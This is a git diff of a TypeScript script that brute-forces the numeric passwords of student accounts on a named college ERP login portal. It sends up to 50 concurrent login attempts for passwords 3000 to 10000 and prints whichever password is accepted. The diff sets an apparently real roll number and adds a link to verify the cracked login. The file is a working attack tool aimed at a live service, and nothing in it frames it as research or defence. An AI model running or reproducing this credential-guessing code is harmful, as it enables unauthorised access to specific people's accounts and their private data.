@@ -1,29 +1,45 @@
+// imports
 import axios from 'axios';
 import qs from 'qs';
 import cheerio from 'cheerio';
 import 'dotenv/config'
 
+// Declarations
 interface RequestConfig {
-    ROLLNUMBER: string;
+    ROLLNUMBER: string | null;
     STARTINDEX: number;
     ENDINDEX: number;
     BATCH: number;
-    MAX_CONCURRENT_REQUESTS: number;
+    readonly MAX_CONCURRENT_REQUESTS: number;
+    HTMLCONTENT: string
+    TXTPASSWORD: number,
+    readonly VERIFYLINK: string
 }
 
+// Initialization
 const REQ_OBJECT: RequestConfig = {
-    ROLLNUMBER: '000000',
+    ROLLNUMBER: '220981',
     STARTINDEX: 3000,
-    ENDINDEX: 8000,
+    ENDINDEX: 10000,
     BATCH: Number(process.env.BATCH) || 50,
-    MAX_CONCURRENT_REQUESTS: 50
+    MAX_CONCURRENT_REQUESTS: 50,
+    HTMLCONTENT: "",
+    TXTPASSWORD: 0,
+    VERIFYLINK: "https://app.sdmes.in/EERPV3.0/EAM/login.jsp?ConsID=SDMCOLL"
 };
 
-async function findPassword(uname: string, txtps: string) {
+// Function Argument Types
+type MainMethodArgs = Pick<RequestConfig, 'ROLLNUMBER' | 'STARTINDEX' | 'ENDINDEX' | 'BATCH' | 'VERIFYLINK'>
+type processBatchMethodArgs = Pick<MainMethodArgs, 'ROLLNUMBER' | 'STARTINDEX' | 'ENDINDEX'>
+type findPasswordMethodArgs = Pick<RequestConfig, 'ROLLNUMBER' | 'TXTPASSWORD'>
+type parseHtmlMethodArgs = Pick<RequestConfig, 'HTMLCONTENT'>
+
+// Solve Each Requests
+async function findPassword({ ROLLNUMBER, TXTPASSWORD }: findPasswordMethodArgs) {
     const data = qs.stringify({
         'ConsID': 'SDMCOLL',
-        'userName': uname,
-        'txtPwd': txtps,
+        'userName': ROLLNUMBER,
+        'txtPwd': TXTPASSWORD,
         'LogTyp': '1',
         'flgS': '1'
     });
@@ -51,23 +67,28 @@ async function findPassword(uname: string, txtps: string) {
 
     try {
         const response = await axios.request(config);
-        return parseHtml(response.data);
+        return parseHtml({ HTMLCONTENT: response.data });
     } catch (error) {
         return null;
     }
 }
 
-function parseHtml(htmlContent: string) {
-    const $ = cheerio.load(htmlContent);
+// Parsing Responses
+function parseHtml({ HTMLCONTENT }: parseHtmlMethodArgs) {
+    const $ = cheerio.load(HTMLCONTENT);
     const parsedText = $('html').text();
     return parsedText.includes("ERROR") ? null : parsedText;
 }
 
-async function processBatch(roll: string, start: number, end: number) {
+// Batch Requests
+async function processBatch({ ROLLNUMBER, STARTINDEX, ENDINDEX }: processBatchMethodArgs) {
     const promises = [];
 
-    for (let i = start; i <= end; i++) {
-        const datapromise = findPassword(roll.toString(), i.toString()).then(result => ({ result, password: i }));
+    for (let i = STARTINDEX; i <= ENDINDEX; i++) {
+        const datapromise = findPassword({
+            ROLLNUMBER,
+            TXTPASSWORD: i
+        }).then(result => ({ result, password: i }));
         promises.push(datapromise);
 
         if (promises.length >= REQ_OBJECT.MAX_CONCURRENT_REQUESTS) {
@@ -91,30 +112,51 @@ async function processBatch(roll: string, start: number, end: number) {
     return null;
 }
 
-async function main(RollNum: string, start: number, end: number, batch: number) {
+// Main Method
+async function main({ ROLLNUMBER, STARTINDEX, ENDINDEX, BATCH, VERIFYLINK }: MainMethodArgs) {
 
-    if (RollNum == '000000') {
-        console.log("Add ROLLNUMBER at line 15");
+    let Num = Number(ROLLNUMBER)
+
+    try {
+        if (Number.isNaN(Num)) {
+            throw new Error
+        }
+        else if (Num >= 300000 || Num <= 200000) {
+            throw new Error
+        }
+    } catch (error) {
+        console.log("ADD VALID ROLLNUMBER TO REQ_OBJECT - line 21");
         return
     }
 
-    for (let j = start; j <= end; j += batch) {
-        console.log("Checking for:", j, "to", j + batch);
+    for (let j = STARTINDEX; j <= ENDINDEX; j += BATCH) {
+        console.log("Checking for:", j, "to", j + BATCH);
 
-        const found = await processBatch(RollNum, j, j + batch);
+        const found = await processBatch(
+            { ROLLNUMBER: ROLLNUMBER, STARTINDEX: j, ENDINDEX: j + BATCH }
+        );
 
         if (found) {
-            console.log("ROLL NUMBER:", RollNum, "\nPASSWORD:", found.password);
+            console.log(
+                "ROLL NUMBER:", ROLLNUMBER,
+                "\nPASSWORD:", found.password,
+                "\nVERIFY HERE:", VERIFYLINK
+            );
             process.exit(1);
         } else {
-            console.log("No password match between", j, "to", j + batch);
+            console.log("No password match between", j, "to", j + BATCH);
+            console.log("Try changing STARTINDEX and ENDINDEX");
         }
     }
 }
 
+// Main Method Call
 main(
-    REQ_OBJECT.ROLLNUMBER,
-    REQ_OBJECT.STARTINDEX,
-    REQ_OBJECT.ENDINDEX,
-    REQ_OBJECT.BATCH,
+    {
+        ROLLNUMBER: REQ_OBJECT.ROLLNUMBER,
+        STARTINDEX: REQ_OBJECT.STARTINDEX,
+        ENDINDEX: REQ_OBJECT.ENDINDEX,
+        BATCH: REQ_OBJECT.BATCH,
+        VERIFYLINK: REQ_OBJECT.VERIFYLINK
+    }
 );
